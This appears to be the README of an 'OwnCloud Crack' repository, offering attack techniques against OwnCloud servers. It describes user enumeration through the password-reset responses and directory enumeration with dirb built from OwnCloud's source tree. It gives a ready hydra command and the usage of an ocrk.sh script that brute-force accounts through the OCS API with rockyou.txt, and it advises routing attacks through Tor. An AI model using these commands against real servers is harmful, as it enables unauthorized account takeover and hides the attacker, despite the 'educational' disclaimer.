
OwnCloud Crack
====
A repository for OwnCloud hacking, originally intended only to bruteforce accounts. Later, more ideas came.

User enumeration
-------

Forgot password option:
User doesn't exist message on web login: "Couldn't send reset email. Please make sure your username is correct."
User exist message on web login: "The link to reset your password has been sent to your email. If you do not receive it within a reasonable amount of time, check your spam/junk folders. If it is not there ask your local administrator."


Folder enumeration
-------

Get the source code from github and the follow the filenames from the core folder.

    git clone https://github.com/owncloud/core
    cd core
    find -follow | sed 's/^\.\///g' > owncloud_files.txt
    dirb https://testdomain.org owncloud_files.txt


Bruteforce OwnCloud accounts using it's OCS API.
-------
Note that these scripts (ocrk.sh and ocrk.py) were written for educational purposes and you can also use hydra:

    hydra domain.org https-post-form "/ocs/v1.php/person/check:login=^USER^&password=^PASS^:S=<status>ok</status>" -L userlist.txt -P rockyou.txt -vv 

ocrk help with the "-h" switch:

    ./ocrk.sh -h

Before run, it's more convinient to make it executable: chmod +x ocrk.sh
Else you need to run it like "sh ocrk.sh"

    Syntax: ./ocrk.sh <site url> <username> <passwordlist>
    Example: ./orck.sh https://www.crkoc.com/ admin rockyou.txt

You can use this over Tor, but the "torify" command is not recommended. Use ". torsocks on" before running.

Use for legal purposes only.
